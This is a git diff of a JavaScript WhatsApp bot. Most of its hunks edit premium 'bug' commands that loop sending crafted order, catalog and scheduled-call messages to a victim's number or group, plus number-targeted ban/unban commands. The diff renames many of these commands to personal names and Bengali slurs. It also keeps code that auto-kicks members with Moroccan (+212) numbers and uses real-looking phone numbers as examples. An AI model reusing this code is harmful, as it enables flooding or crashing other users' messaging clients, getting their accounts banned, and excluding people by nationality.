@@ -445,6 +445,33 @@ if (global.autokickmorroco) {
 if (m.isGroup && m.sender.startsWith('212')) return XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
 }
 
+//reply
+const pickRandom = (arr) => {
+  return arr[Math.floor(Math.random() * arr.length)]
+  }
+  
+  const responses = {
+
+  
+  hello: `Hello ${pushname}, I am ${global.botname}. I can be used without prefix. How can I help you?`,
+  venox: `My honeybunny is lost in Hentai World, and I lost connection with him...`,
+  wassap: `Konichiwa ${pushname}, I am ${global.botname}. How can I help you?`,
+  kanna: 'Oii..! baka , I am busy assisting the users',
+  p: `Hey ${pushname}, Latency ${latensie.toFixed(4)} ms`,
+  'good morning': `Good morning to you too ${pushname} ☺️. Have a great day 😇.`,
+  ohayo: `Good morning to you too ${pushname} ☺️. Have a great day 😇.`,
+  'good afternoon': `Good afternoon to you too ${pushname} ✨. Wishing you an enjoyable afternoon too 😇🤞🏻.`,
+  'good night': `Good night to you too ${pushname} 😇. Sleep well and sweet dreams.`,
+ 
+};
+
+const smallinput = budy.toLowerCase();
+
+if (responses.hasOwnProperty(smallinput)) {
+  reply(responses[smallinput]);
+}
+
+
 //antispam kick
 if (global.antispam) {
 if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
@@ -1535,9 +1562,8 @@ case 'listmenu': case 'menu': case 'list': case 'help': case 'manual': case 'ins
             let timestampe = speed()
             let mono = '```'
             let latensie = speed() - timestampe
-            xeonezy = `${xeonytimewisher}
+            const listmenu = `${xeonytimewisher}
 
-${mono}
 📚*ᴜᴘ ᴛɪᴍᴇ:* ${xtime}
 🍁*ᴛᴏᴅᴀʏ ɪs:*  ${xdate}
 📍*ɴᴏᴡ ᴛɪᴍᴇ:* ${runtime(process.uptime())}
@@ -1547,8 +1573,8 @@ ${mono}
 ➮ Oᴡɴᴇʀ-Nᴜᴍ:  ${ownernumber}
 ➮ Mᴏᴅᴇ: ${XeonBotInc.public ? 'Public' : `Private`}
 ➮ Pʀᴇᴍɪᴜᴍ:  ${isPrem ? '✅' : `❌`}
-${mono}
 ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
+
 
 ╭──❰ *LIST MENU* ❱
 │
@@ -1567,25 +1593,17 @@ ${mono}
 │🏮${mono}socialmenu${mono}
 │🏮${mono}toolsmenu${mono}
 ╰─────────────⦁`
-            let ments = [ownernya, me, mark]        
-           XeonBotInc.sendMessage(from, { 
-text: xeonezy,
-contextInfo:{
-forwardingScore: 9999999,
-isForwarded: true, 
-mentionedJid:[sender],
-"externalAdReply": {
-"showAdAttribution": true,
-"renderLargerThumbnail": true,
-"title": botname, 
-"containsAutoReply": true,
-"mediaType": 2, 
-"thumbnail": fs.readFileSync("./VenoxGallery/theme/lolikanna.mp4")
-}
-}
-}, { quoted: m })
-           }
-           break
+            let buttonMessage = {
+                      video:fs.readFileSync('./VenoxGallery/theme/lolikanna.mp4'),gifPlayback:true,
+                      caption: listmenu,
+                      
+                      headerType: 4
+                      
+                  }
+                  XeonBotInc.sendMessage(m.chat, buttonMessage,{ quoted:m })
+                  }
+  break
+  
 case 'allmenu': {
 var unicorn = await getBuffer(picak+'All Menu')
 sendXeonBotIncMessage(from, { 
@@ -2447,7 +2465,7 @@ break
                  XeonBotInc.sendTextWithMentions(m.chat, teks, m)
              }
              break
-             case 'ping': case 'botstatus': case 'statusbot': case 'p': {
+             case 'ping': case 'botstatus': case 'statusbot': case 'pingmenu': {
 	const used = process.memoryUsage()
                 const cpus = os.cpus().map(cpu => {
                     cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
@@ -2493,8 +2511,8 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 `.trim()
 	XeonBotInc.relayMessage(m.chat,  {
         requestPaymentMessage: {
-          currencyCodeIso4217: 'BDT',
-          amount1000: 69,
+          currencyCodeIso4217: 'USD',
+          amount1000: 0.99,
           requestFrom: m.sender,
           noteMessage: {
           extendedTextMessage: {
@@ -6155,7 +6173,7 @@ console.log(err);
 replygcxeon("Sorry, there seems to be an error :"+ err);
 }
 break
-case 'myip': {
+case 'mylocation': {
         if (!XeonTheCreator) return XeonStickOwner()
         if (m.isGroup) return XeonStickPrivate()
                 var http = require('http')
@@ -6708,7 +6726,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'delaybug' : {
 if (!isPrem) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919587210657`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 8801853262586`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
@@ -6729,7 +6747,7 @@ replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'docubug': {
 if (!isPrem) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919587210657`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 8801853262586`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "15"
@@ -6748,7 +6766,7 @@ await sleep(3000)
 }
 replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
-case 'unlimitedbug' : {
+case 'sakib' : {
 if (!isPrem) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919587210657`)
 await loading()
@@ -6769,7 +6787,7 @@ await sleep(3000)
 }
 replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
-case 'lagbug' : {
+case 'simanto' : {
 if (!isPrem) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
@@ -6792,7 +6810,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'trollybug': {
 if (!isPrem) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 8801853262586`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "15"
@@ -6806,7 +6824,7 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "surface": "CATALOG",
 "message": `${botname}`,
 "orderTitle": " TROLLY BUG ", 
-"sellerJid": "916909137213@s.whatsapp.net",
+"sellerJid": "8801853262586@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: from, quoted:m})
@@ -6817,9 +6835,9 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'gcbug' : {
 if (!isPrem) return replygcxeon(mess.premium)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKyz8zEvk9ooys2g`)
 await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
+let result = args[0].split('https://chat.whatsapp.com/ENa2JHQleNvCGUouZp5VQB')[1]
 let xeongc = await XeonBotInc.groupAcceptInvite(result)
 amount = "30"
 for (let i = 0; i < amount; i++) {
@@ -6827,7 +6845,7 @@ const xeonybug1 = `${xeontext1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Dhaka").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -6837,7 +6855,7 @@ await sleep(3000)
 replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
 }
 break
-case 'delaygcbug' :  {
+case 'tahsin' :  {
 if (!isPrem) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
@@ -6859,7 +6877,7 @@ await sleep(3000)
 replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
 }
 break
-case 'laggcbug' :  {
+case 'mannanerpola' :  {
 if (!isPrem) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
@@ -6881,7 +6899,7 @@ await sleep(3000)
 replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
 }
 break
-case 'bomgcbug' :  {
+case 'khankirchele' :  {
 if (!isPrem) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
@@ -6903,7 +6921,7 @@ await sleep(3000)
 replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
 }
 break
-case 'unlimitedgcbug' :  {
+case 'buskimagirpola' :  {
 if (!isPrem) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
@@ -6925,7 +6943,7 @@ await sleep(3000)
 replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
 }
 break
-case 'trollygcbug' :  {
+case 'oishik' :  {
 if (!isPrem) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
@@ -6951,7 +6969,7 @@ XeonBotInc.relayMessage(xeongc, order.message, { messageId: order.key.id })
 replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
 }
 break
-case 'docugcbug' :  {
+case 'bisas' :  {
 if (!isPrem) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
@@ -7107,7 +7125,7 @@ let res = await axioss({
 XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
-case 'banv3': {
+case 'otununu': {
 if (!isPrem) return replyprem(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
 let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
@@ -7151,7 +7169,7 @@ let res = await axioss({
 XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
-case 'banv4': {
+case 'sutrodhon': {
 if (!isPrem) return replyprem(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
 let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
@@ -7195,7 +7213,7 @@ let res = await axioss({
 XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
-case 'banv5': {
+case 'saaakib': {
 if (!isPrem) return replyprem(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
 xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
@@ -7239,7 +7257,7 @@ let res = await axioss({
 XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
-case 'banv6': {
+case 'sadikul': {
 if (!isPrem) return replyprem(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
 let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
@@ -7371,7 +7389,7 @@ let res = await axioss({
 XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
-case 'unbanv3': {
+case 'rudro': {
 if (!isPrem) return replyprem(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
 let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
@@ -7415,7 +7433,7 @@ let res = await axioss({
 XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
-case 'unbanv4': {
+case 'gondaar': {
 if (!isPrem) return replyprem(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
 let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
@@ -7459,7 +7477,7 @@ let res = await axioss({
 XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
-case 'unbanv5': {
+case 'oolok': {
 if (!isPrem) return replyprem(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
 let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
